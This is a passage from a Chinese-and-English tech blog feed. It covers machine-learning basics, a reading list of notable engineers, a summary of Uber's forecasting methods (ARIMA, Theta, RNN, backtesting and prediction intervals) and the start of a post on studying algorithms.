<p>A recurrent neural network (RNN) is a class of artificial neural network where connections between units form a directed cycle. This creates an internal state of the network which allows it to exhibit dynamic temporal behavior. Unlike feedforward neural networks, RNNs can use their internal memory to process arbitrary sequences of inputs. This makes them applicable to tasks such as unsegmented connected handwriting recognition or speech recognition.</p>
<p>递归神经网络（RNN）是两种人工神经网络的总称。时间递归神经网络的神经元间连接构成有向图，而结构递归神经网络利用相似的神经网络结构递归构造更为复杂的深度网络。单纯递归神经网络因为无法处理随着递归，权重指数级爆炸或消失的问题（Vanishing gradient problem），难以捕捉长期时间关联；而结合不同的LSTM可以很好解决这个问题。</p>
<h4 id="GAN"><a href="#GAN" class="headerlink" title="GAN"></a>GAN</h4><p>Generative Adversarial Network，生成对抗网络<br>非监督式学习的一种方法，通过让两个神经网络相互博弈的方式进行学习。该方法由伊恩·古德费洛等人于2014年提出）</p>
<h4 id="Autoencoders-自动编码"><a href="#Autoencoders-自动编码" class="headerlink" title="Autoencoders 自动编码"></a>Autoencoders 自动编码</h4><h4 id="Reinforcement-Learning-强化学习"><a href="#Reinforcement-Learning-强化学习" class="headerlink" title="Reinforcement Learning 强化学习"></a>Reinforcement Learning 强化学习</h4><p>Reinforcement learning is an area of machine learning inspired by behaviorist psychology, concerned with how software agents ought to take actions in an environment so as to maximize some notion of cumulative reward. The problem, due to its generality, is studied in many other disciplines, such as game theory, control theory, operations research, information theory, simulation-based optimization, multi-agent systems, swarm intelligence, statistics, and genetic algorithms. In the operations research and control literature, the field where reinforcement learning methods are studied is called approximate dynamic programming. The problem has been studied in the theory of optimal control, though most studies are concerned with the existence of optimal solutions and their characterization, and not with the learning or approximation aspects. In economics and game theory, reinforcement learning may be used to explain how equilibrium may arise under bounded rationality.</p>
<p>强化学习是机器学习中的一个领域，强调如何基于环境而行动，以取得最大化的预期利益。其灵感来源于心理学中的行为主义理论，即有机体如何在环境给予的奖励或惩罚的刺激下，逐步形成对刺激的预期，产生能获得最大利益的习惯性行为。这个方法具有普适性，因此在其他许多领域都有研究，例如博弈论、控制论、运筹学、信息论、模拟优化方法、多主体系统学习、群体智能、统计学以及遗传算法。在运筹学和控制理论研究的语境下，强化学习被称作“近似动态规划”（approximate dynamic programming，ADP）。在最优控制理论中也有研究这个问题，虽然大部分的研究是关于最优解的存在和特性，并非是学习或者近似方面。在经济学和博弈论中，强化学习被用来解释在有限理性的条件下如何出现平衡。</p>
<h2 id="Open-Source-Library"><a href="#Open-Source-Library" class="headerlink" title="Open Source Library"></a>Open Source Library</h2><h4 id="TensorFlow"><a href="#TensorFlow" class="headerlink" title="TensorFlow"></a>TensorFlow</h4><p>TensorFlow is an open source software library for machine learning in various kinds of perceptual and language understanding tasks. It is a second-generation API which is currently used for both research and production by 50 different teams in dozens of commercial Google products, such as speech recognition, Gmail, Google Photos, and Search. These teams had previously used DistBelief, a first-generation API. TensorFlow was originally developed by the Google Brain team for Google’s research and production purposes and later released under the Apache 2.0 open source license on November 9, 2015.</p>
<h4 id="Scikit-Learn-机器学习算法库"><a href="#Scikit-Learn-机器学习算法库" class="headerlink" title="Scikit-Learn 机器学习算法库"></a>Scikit-Learn 机器学习算法库</h4><p>Scikit-Learn(formerly scikits.learn) is a free software machine learning library for the Python programming language. It features various classification, regression and clustering algorithms including support vector machines, random forests, gradient boosting, k-means and DBSCAN, and is designed to interoperate with the Python numerical and scientific libraries NumPy and SciPy.</p>
<h4 id="COCO-SSD"><a href="#COCO-SSD" class="headerlink" title="COCO SSD"></a>COCO SSD</h4><p>Ok that worked pretty well, but how do we deal with images that show multiple objects. Well to recognize multiple objects in a single image, we will utilize what’s called a Single Shot Multibox Detector (SSD). In our second example we will look at a SSD model trained with the COCO (Common Object in Context) dataset. The model we are using has been trained on 84 different classes.</p>
<h2 id="扩展阅读-《The-Machine-Learning-Master》"><a href="#扩展阅读-《The-Machine-Learning-Master》" class="headerlink" title="扩展阅读:《The Machine Learning Master》"></a>扩展阅读:<a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h2><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Study The Master</title>
    <url>/2017/02/13/Master/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Master Citation Index（持续更新）</li>
</ul>
<blockquote>
<p>If you want to master something, teach it. —— Richard Feynman</p>
</blockquote>
<span id="more"></span>
<h2 id="什么是经典文献？"><a href="#什么是经典文献？" class="headerlink" title="什么是经典文献？"></a>什么是经典文献？</h2><p>基于Calvino（2000），Kuhn（2012）和Soderlund及Geraldi（2012）的理论，作者建立了学术领域判断经典文献的方法：</p>
<ul>
<li>首先，影响力；</li>
<li>其二，对公共话语影响的持久价值；</li>
<li>第三，对学科形成的影响，这是核心的，也是最难判断的；</li>
<li>第四，文献需要对读者产生个人影响。</li>
</ul>
<p>例如，美国项目管理协会PMI的PMBOK虽然能满足第一和第二个标准，但无法满足第四个标准，当读第二遍时，读者无法从中获得更深刻的洞见，因此只是基础的知识范围概括，而不是经典文献。</p>
<h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><ul>
<li><a href="https://riboseyim.com/2018/09/15/Engineering-Blog/">Engineering Blog</a></li>
<li><a href="https://riboseyim.com/2018/09/11/Engineering-Index/">Engineering Index</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">机器学习书单</a></li>
</ul>
<h2 id="Master-Citation-Index"><a href="#Master-Citation-Index" class="headerlink" title="Master Citation Index"></a>Master Citation Index</h2><h4 id="唐·诺曼-Donald-Arthur-Norman"><a href="#唐·诺曼-Donald-Arthur-Norman" class="headerlink" title="唐·诺曼 Donald Arthur Norman"></a><a href="https://zh.wikipedia.org/wiki/唐·諾曼">唐·诺曼 Donald Arthur Norman</a></h4><h2 id="Engineering"><a href="#Engineering" class="headerlink" title="Engineering"></a>Engineering</h2><h4 id="Henry-Petroski"><a href="#Henry-Petroski" class="headerlink" title="Henry Petroski"></a><a href="https://en.wikipedia.org/wiki/Henry_Petroski">Henry Petroski</a></h4><ul>
<li>《 To Engineer is Human: The Role of Failure in Successful Design (1985)》|</li>
</ul>
<h2 id="Scientist"><a href="#Scientist" class="headerlink" title="Scientist"></a>Scientist</h2><ul>
<li><a href="http://www.cs.toronto.edu/~hinton/">杰弗里·埃弗里斯特·辛顿（Geoffrey Everest Hinton）</a></li>
</ul>
<h2 id="Information-Technology"><a href="#Information-Technology" class="headerlink" title="Information Technology"></a>Information Technology</h2><h2 id="Hackers"><a href="#Hackers" class="headerlink" title="Hackers"></a>Hackers</h2><h4 id="Paul-Graham-（保罗·格雷厄姆）"><a href="#Paul-Graham-（保罗·格雷厄姆）" class="headerlink" title="Paul Graham （保罗·格雷厄姆）"></a><a href="http://paulgraham.com">Paul Graham （保罗·格雷厄姆）</a></h4><p>美国著名程序员、风险投资家、技术作家。Paul Graham 以 Lisp 方面的工作而知名，也是最早的Web应用Viaweb的创办者之一，后来以近5千万美元价格被雅虎收购，成为Yahoo! Store。他拥有哈佛大学应用科学（计算机方向）博士学位，担任麻省理工学院副教授，并且在罗德岛设计学院和佛罗伦萨绘画艺术学院学习过绘画。</p>
<p>代表作：<a href="https://riboseyim.github.io/2017/05/09/CyberSecurity-Hacker/">《黑客与画家》（Hackers &amp; Painters）</a> 内容来自 Paul Graham 的博客，该文集主要讨论编程语言、黑客工作方法以及作者对于教育、版权制度和创业精神等方面的观点。书中的内容不但有助于了解计算机编程的历史、互联网行业规则，还有助于读者了解我们这个时代，走进 Hacker 的精神世界。</p>
<h2 id="System-Specialist"><a href="#System-Specialist" class="headerlink" title="System Specialist"></a>System Specialist</h2><h4 id="Brendan-Gregg"><a href="#Brendan-Gregg" class="headerlink" title="Brendan Gregg"></a><a href="http://www.brendangregg.com">Brendan Gregg</a></h4><blockquote>
<p>DTrace Top 1</p>
</blockquote>
<ul>
<li><a href="https://www.linkedin.com/in/sashag/?ppe=1">Sasha Goldshtein</a></li>
</ul>
<blockquote>
<p>Currently interested in .NET performance optimization, modern C++, parallel programming frameworks, production debugging, native mobile application development, Node.js, Microsoft Azure, and cyber-warfare (security).</p>
</blockquote>
<ul>
<li><a href="https://www.youtube.com/watch?v=jz3SvJhdtEw">Sasha Goldshtein: Making .NET applications faster</a></li>
<li><a href="http://blogs.microsoft.co.il/sasha/2017/03/30/tracing-runtime-events-in-net-core-on-linux/">Sasha Goldshtein:Tracing Runtime Events in .NET Core on Linux</a></li>
</ul>
<h4 id="章亦春-agentzh"><a href="#章亦春-agentzh" class="headerlink" title="章亦春|agentzh"></a><a href="http://agentzh.org/">章亦春|agentzh</a></h4><blockquote>
<p>Nginx developer, DTrace</p>
</blockquote>
<ul>
<li><a href="https://openresty.org/posts/dynamic-tracing/">动态追踪技术漫谈</a></li>
</ul>
<ul>
<li><a href="http://duartes.org/gustavo/blog/">Gustavo Duarte</a></li>
</ul>
<blockquote>
<p>OS kernel</p>
</blockquote>
<ul>
<li><a href="https://jvns.ca/blog/">Julia Evans</a></li>
</ul>
<blockquote>
<p>OS kernel,DTrace,Rust</p>
</blockquote>
<h2 id="Front-Specialist"><a href="#Front-Specialist" class="headerlink" title="Front Specialist"></a>Front Specialist</h2><h4 id="邱俊涛"><a href="#邱俊涛" class="headerlink" title="邱俊涛"></a><a href="http://icodeit.org/about-me">邱俊涛</a></h4><blockquote>
<p>Front, Tools, methodology</p>
</blockquote>
<p>主要的编程语言是Java和JavaScript，也有几年Linux下C语言的开发经验，喜欢各种动态语言，尤其如JavaScript，而现在Ruby也成了我工具箱里最主要的工具了。目前关注在前端，对于 使用前端技术搭建轻量级的Web应用尤为感兴趣。</p>
<p>《JavaScript核心概念及实践》<br>《轻量级Web应用开发》<br>《3周3Web设计》<br>《Fun with underscore.js》</p>
<h4 id="阮一峰"><a href="#阮一峰" class="headerlink" title="阮一峰"></a><a href="http://www.ruanyifeng.com/blog/">阮一峰</a></h4><blockquote>
<p>My name is Ruan YiFeng(阮一峰). You can call me Frank. I was born in 1970s.<br>I am an IT developer focusing on web technology, and a strong advocate and believer of Free Software.<br>Now I am employed by Alipay.com as an Node/JavaScript engineer.<br>I have an Economics degree, and once worked for a local college in Shanghai as an assistant professor.</p>
</blockquote>
<p>ECMAScript 6入门（电子工业出版社，2014，ISBN 9787121238369）<br>黑客与画家（人民邮电出版社，2011，ISBN 9787115249494）<br>软件随想录（人民邮电出版社，2009，ISBN 9787115216342）<br>异常流行幻象与群众疯狂/困惑之惑（[台湾]财讯出版社，2007，ISBN 9789867084385）<br>下一个大泡泡（中国社会科学出版社，2005，ISBN 9787500452300）</p>
<h2 id="Database-Specialist"><a href="#Database-Specialist" class="headerlink" title="Database Specialist"></a>Database Specialist</h2><ul>
<li><a href="http://www.eygle.com/">盖国强</a></li>
</ul>
<blockquote>
<p>Oracle</p>
</blockquote>
<h3 id="C-Specialist"><a href="#C-Specialist" class="headerlink" title="C Specialist"></a>C Specialist</h3><ul>
<li><a href="http://blog.codingnow.com">云风-吴云洋</a></li>
</ul>
<blockquote>
<p>C,Game<br>真名吴云洋，曾任网易杭州研究中心总监，是网易《大话西游》、《梦幻西游》等游戏的主要开发者，他在2011年9月从网易辞职，并与前网易COO詹钟晖联合创办了简悦（EJOY）游戏公司，任公司CTO。Ejoy2D创始人（一款基于C和Lua开发的游戏图形引擎）</p>
</blockquote>
<h4 id="综合类"><a href="#综合类" class="headerlink" title="综合类"></a>综合类</h4><ul>
<li><a href="https://github.com/wizardforcel">张子辰（龙哥/飞龙）|Wizard Zhang</a></li>
</ul>
<p><strong>大量</strong> 翻译作品，编程语言、算法、机器学习等</p>
<h3 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h3><ul>
<li><a href="http://jaseywang.me/about/">Yuxi Wang</a></li>
</ul>
<blockquote>
<p>Tech Lead of Operations team at 本木医疗</p>
</blockquote>
<ul>
<li><a href="http://jaseywang.me/2017/03/04/%e5%85%a8%e7%bd%91%e7%bb%9f%e4%b8%80%e8%b4%a6%e6%88%b7%e5%ae%9e%e8%b7%b5/">全网统一账户实践</a></li>
<li><a href="http://jaseywang.me/2017/02/08/%E6%A0%91%E8%8E%93%E6%B4%BEraspberrypi%E3%80%81saltstack-%E5%9C%A8%E7%BA%BF%E4%B8%8B%E8%87%AA%E5%8A%A9%E6%9C%BA%E8%BF%90%E7%BB%B4%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/">树莓派raspberrypi、saltstack-在线下自助机运维上的应用/</a></li>
<li><a href="http://jaseywang.me/2017/01/06/%E9%80%9A%E8%BF%87-novnc-%E5%AE%9E%E7%8E%B0%E6%95%B0%E5%8D%83%E5%8F%B0%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%9A%84%E5%AE%9E%E6%97%B6%E5%8F%AF%E8%A7%86%E5%8C%96/">通过-novnc-实现数千台自助机的实时可视化/</a></li>
</ul>
<h3 id="概要知识地图"><a href="#概要知识地图" class="headerlink" title="概要知识地图"></a>概要知识地图</h3><ul>
<li><a href="">StuQ 技能图谱</a><br>由 <a href="http://www.stuq.org/">StuQ</a> 发起的一个开源项目，志在汇集整理 IT 职业必备技术技能，帮助技术人梳理知识框架结构，并尝试提供学习路径和精华资源，方便技术人学习成长。</li>
</ul>
<p><a href="https://github.com/TeamStuQ/skill-map">项目地址（Github）</a></p>
<p><a href="http://mp.weixin.qq.com/bizmall/mallshelf?id=&amp;t=mall/list&amp;biz=MzI1ODExMzMzNA==&amp;shelf_id=3&amp;showwxpaytitle=1#wechat_redirect">纸质版</a></p>
<h3 id="源代码库"><a href="#源代码库" class="headerlink" title="源代码库"></a>源代码库</h3><ul>
<li><a href="#">NASA</a></li>
</ul>
<ul>
<li><a href="https://linuxstory.org/nasa-releases-abundance-of-free-code/">来自火箭科学，NASA发布了大量的免费代码 | Linux Story</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>Uber 业务预测系统实践</title>
    <url>/2018/10/03/Machine-Learning-Uber/</url>
    <content><![CDATA[<ul>
<li>Forecasting is ubiquitous</li>
<li>如何利用预测来构建更好的产品和服务</li>
<li>定量预测方法可分为：基于模型（model-based）或因果关系，统计方法（statistical methods）和机器学习方法（machine learning approaches）</li>
</ul>
<span id="more"></span>
<ul>
<li><a href="https://eng.uber.com/forecasting-introduction">Forecasting at Uber: An Introduction | September 6, 2018 | By Franziska Bell, Slawek Smyl</a></li>
</ul>
<p>近年来，机器学习，深度学习和概率编程在精准预测方面显示出巨大潜力。除普通的统计算法外，Uber 还使用这三种技术构建预测解决方案。下面将讨论 Uber 预测系统使用的关键组件，流行方法，回溯测试和预测区间。</p>
<p>预测无处不在。除了战略预测之外（例如预测收入，生产和支出），产业界还需要能够针对短期战术行为作出准确预测（例如订货数量和招聘需求），以跟上企业的成长步伐。Uber 常见的预测场景包括：</p>
<ul>
<li><p>市场预测（Marketplace forecasting）：作为 Uber 平台的一个关键要素，市场预测能够基于精准时间和空间的方式预测用户供需，以便引导驾驶员在高峰出现之前到达高需求区域，从而增加运输次数和收入。时空预测（Spatio-temporal forecasts）仍然是一个开放的研究领域。</p>
</li>
<li><p>硬件容量规划（Hardware capacity planning）：硬件供应不足可能导致服务中断、损害用户信任度，但是过度配置又会增加运营成本。预测可以帮助找到最佳点：不太多也不太少。</p>
</li>
<li><p>市场营销（Marketing）：了解不同媒体渠道的边际效果至关重要，需要兼顾趋势、季节性和其他动态因素（例如竞争或定价），同时，利用先进的预测方法构建更可靠的估价，并使大规模地制定基于数据驱动的营销决策成为可能。</p>
</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Uber-forecasting-Marketplace.gif" alt="Figure 1. Marketplace forecasting in California’s Bay Area allows us to direct drivers to high-demand areas."></p>
<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><p>Uber 平台在真实的物理世界运行，现实中的参与者的行为和兴趣各不相同，运行模式本身存在物理约束和不可预测性。物理约束，如地理距离和道路吞吐量，预测行为需要从时间域（temporal domain）转移到时空域(spatio-temporal domain)。尽管 Uber 是一家相对年轻的公司（已有8年历史），确保预测模型与高速成长的运营速度和规模保持同步至关重要。</p>
<p>下面的图2 提供了一个超过14个月的城市旅行数据示例。你可以注意到很多变化，同时可以看到一个增长的趋势和季节性周期（例如，12 月通常有更多的高峰日期，因为整个月份散布着很多主要假期）。如果我们将图形放大（图3）并切换到2017年7月的每小时数据，您会注意到每日和每周（7* 24）的季节性。你可能会注意到周末往往比平时更加繁忙。</p>
<p>预测方法需要能够针对上述复杂模式进行建模。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Uber-forecasting-F2.png" alt="Figure 2. Leveraging the daily sum of Uber trips in a city, we can better predict the amount and frequency of future trips."></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Uber-forecasting-F3.png" alt="Figure 3. The hourly sum of Uber trips in a given month (in July 2017) help us model user patterns."></p>
<h2 id="Prominent-forecasting-approaches"><a href="#Prominent-forecasting-approaches" class="headerlink" title="Prominent forecasting approaches"></a>Prominent forecasting approaches</h2><p>除定性方法外，定量预测方法可分为以下几类：基于模型（model-based）或因果关系，统计方法（statistical methods）和机器学习方法（machine learning approaches）。</p>
<p>当问题的基础机制或物理原理是已知时，基于模型的预测方法效果最好，因此基于模型的方法应用于许多科学和工程环境中。基于模型也是计量经济学中的常用方法，模型遵循的理论基础不尽相同。</p>
<p>当基础机制未知或过于复杂时，例如股票市场，或者不完全已知，例如零售，通常应用简单的统计模型。属于这一类的流行经典方法包括 ARIMA（Autoregressive Integrated Moving Average,自回归求和移动平均模式），指数平滑方法，如 Holt-Winters ，以及Theta方法，它使用较少，但表现非常好。Theta 方法赢得了 M3 预测竞赛（M3 Forecasting Competition），我们也发现它在 Uber的时间序列上运行良好（此外，它的计算成本也很廉价）。</p>
<p>近年来，机器学习方法，包括分位数回归森林算法（quantile regression forests ，QRF），著名的随机森林算法的表兄弟，已成为预测工具包的一部分。如果有足够的数据，特别是外源性回归量，递归神经网络算法（Recurrent neural networks ，RNN）也被证明是非常有用的。通常，这些机器学习算法是黑盒模型，并且在不需要可解释性时使用。流行经典和机器学习预测方法概要：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Classical &amp; Statistical</th>
<th>Machine Learning</th>
</tr>
</thead>
<tbody>
<tr>
<td>Autoregressive integrated moving average (ARIMA) <br> Exponential smoothing methods (e.g. Holt-Winters) <br> Theta</td>
<td>Recurrent neural networks (RNN) <br> Quantile regression forest (QRF) <br> Gradient boosting trees (GBM) <br> Support vector regression (SVR) <br> Gaussian Process regression (GP)</td>
</tr>
</tbody>
</table>
</div>
<p>有趣的是，M4 预测竞赛（M4 Forecasting Competition）的获奖作品是一个混合模型 <a href="https://eng.uber.com/m4-forecasting-competition/">ES-RNN,Exponential Smoothing-Recurrent Neural Networks</a>，其中包括手工编码平滑公式（灵感来自众所周知的 Holt-Winters 方法）和一堆扩展的长短期记忆单元（ long short-term memory units ，LSTM，一种时间递归神经网络）。</p>
<p>实际上，经典预测方法和机器学习方法彼此之间并没有区别，不过是通过模型是否更简单、可解释或更复杂和灵活来区分。在实践中，经典统计算法往往更快更容易使用。</p>
<p>在 Uber 为特定场景用例选择的预测方法实际一个包含许多参数的函数，包括可用的历史数据量、外生变量（例如，天气，音乐会等）是否发挥重要作用，以及业务需求（例如，模型是否需要可解释？）。然而，最重要的是，我们无法确定哪种方法会产生最佳性能，因此有必要比较多种方法的模型性能。</p>
<h2 id="Comparing-forecasting-methods"><a href="#Comparing-forecasting-methods" class="headerlink" title="Comparing forecasting methods"></a>Comparing forecasting methods</h2><p>对于时间序列而言排序很重要，因此必须按时间顺序进行测试。实验者不能在中间切出一块，并在此部分之前和之后训练数据。相反，需要训练一组比测试数据更早的数据。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Uber-forecasting-F4.png" alt="Figure 4: Two major approaches to test forecasting models are the sliding window approach (left) and the expanding window approach (right)."></p>
<p>考虑到这一点，上面图4 中概述了两种主要方法：滑动窗口方法（the sliding window approach）和扩展窗口方法（the expanding window approach）。在滑动窗口方法中，使用固定大小的窗口（此处以黑色显示）进行训练。随后，针对橙色显示的数据测试该方法。</p>
<p>另一方面，扩展窗口方法使用越来越多的训练数据，同时保持测试窗口大小固定。如果要处理的数据量有限，后一种方法特别有效。将这两种方法结合起来也是可能的，而且通常最理想：从扩展窗口方法开始，当窗口变得足够大时，切换到滑动窗口方法。</p>
<p>在这个领域已经提出了许多评估指标，包括绝对误差（ absolute errors ）和百分比误差（percentage errors），这些指标有一些缺点。一种特别有用的方法是将模型性能与天真预测法（naive forecast）进行比较。在非季节性的情况下，天真预测法假设最后一个值等于下一个值。对于周期性时间序列，预测估计值等于先前的季节值（例如，对于具有每周周期性的每小时时间序列，天真预测法假设下一个值是一周前的当前小时的值）。</p>
<p>为了更容易地选择正确的预测方法，Uber 预测平台团队构建了一个名为 <strong><a href="https://eng.uber.com/omphalos/">Omphalos</a></strong> 的回溯测试框架，该框架支持并行并且语言可扩展，以支持快速迭代和预测方法比较。</p>
<h2 id="The-importance-of-uncertainty-estimation"><a href="#The-importance-of-uncertainty-estimation" class="headerlink" title="The importance of uncertainty estimation"></a>The importance of uncertainty estimation</h2><p>确定给定用例的最佳预测方法只是等式的一半。我们还需要估计预测区间。预测区间是预测值的上限和下限，预期实际值在某些（通常是高的）概率之间，例如， 0.9。图5 显示预测区间的工作原理：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Uber-forecasting-F5.png" alt="Figure 5: Prediction intervals are critical to informed decision making. Although point forecasts may be the same, their prediction intervals may be significantly different."></p>
<p>在图5中，紫色的点表示预测完全相同。但是，左图中的预测区间比右图中的预测区间窄得多。预测区间的差异导致两种截然不同的预测结果，特别是考虑容量规划的背景下：第二次预测需要更高的容量储备以允许需求大幅增加的可能性。</p>
<p>预测区间与预测点本身一样重要，应始终包含在预测中。预测区间通常取决于我们拥有多少数据，此数据中有多少变化，我们预测的偏差以及使用的预测方法。</p>
<h2 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h2><p>在后续的文章中将深入研究技术细节。本系列的下一篇文章将专门用于讨论数据预处理。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.github.io/2018/10/03/Machine-Learning-Uber/">Uber 业务预测系统实践</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://colah.github.io/posts/2015-08-Understanding-LSTMs/">Understanding LSTM Networks</a></li>
<li><a href="https://tech.meituan.com/order_holtwinter.html">美团技术团队|外卖订单量预测异常报警模型实践</a></li>
<li><a href="https://eng.uber.com/m4-forecasting-competition/">ES-RNN,Exponential Smoothing-Recurrent Neural Networks</a></li>
<li><a href="http://www.jmlr.org/papers/volume7/meinshausen06a/meinshausen06a.pdf">Quantile Regression Forests | Journal of Machine Learning Research 7 (2006) </a></li>
<li><a href="https://eng.uber.com/omphalos/">Omphalos, Uber’s Parallel and Language-Extensible Time Series Backtesting Tool</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>数学与算法</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>算法</title>
    <url>/2018/12/31/Mathmetics-Algorithm/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>任何一种计算方法——除非它能提供一种编写程序的方法，否则不会有太大的用处。— 理查德·费曼</p>
</blockquote>
<a id="more"></a>
<h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><ul>
<li><p><a href="https://www.youtube.com/watch?v=DG5-UyRBQD4" target="_blank" rel="noopener">3Blue1Brown: Very Basic Intro to Neural Networks</a><br>3Blue1Brown 是一个数学学习频道。其发布的视频通过动画演示和讲解，帮助观者在头脑中构建有关数学概念定义定理的最生动直观的理解，致力于将复杂得数学概念可视化。</p>
</li>
<li><p><a href="http://coolshell.cn/articles/12052.html" target="_blank" rel="noopener">Leetcode 编程训练</a></p>
<blockquote>
<p>Leetcode这个网站上的题都是一些经典的公司用来面试应聘者的面试题，很多人通过刷这些题来应聘一些喜欢面试算法的公司</p>
</blockquote>
</li>
</ul>
<h4 id="掌握算法是IT工程师的基本功"><a href="#掌握算法是IT工程师的基本功" class="headerlink" title="掌握算法是IT工程师的基本功"></a>掌握算法是IT工程师的基本功</h4><ul>
<li><p>掌握优点和缺点:折中的思维不仅体现在算法上，在架构上也是一样的。</p>
</li>
<li><p>通过图上推演来思考:推荐自己画图，然后向别人说明。先从基本操作入手，再掌握更详细的操作和异常操作，不要试图一下子理解所有细致末节。<br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_suanfa_1.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_suanfa_2.png" alt></p>
</li>
<li><p>日常生活中的算法例子</p>
</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_suanfa_3.png" alt></p>
<ul>
<li><p>比较算法优劣:我们会忽略一些微小的系统开销。我们应该关注的是随着数据个数的变化，所花费的时间会以怎样的曲线发生变化。因为有一些算法，在数据只有一两个的时候性能很好，但是当数据个数达到几千到几万的时候，性能会急剧下降。</p>
</li>
<li><p>评价算法的指标</p>
</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_suanfa_4.png" alt></p>
<ul>
<li>通过复杂度来评价算法</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_suanfa_5.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/ChartPerf_512_suanfa_6.png" alt></p>
<ul>
<li>掌握算法要靠编程:对于新人来说，编程经验不足会成为瓶颈.没有编程经验，就无法进行整体的把握，不能举一反三，只能死记硬背。</li>
<li>算法例子:数组、链表、树、散列算法、队列、栈、排序、缓存、锁</li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
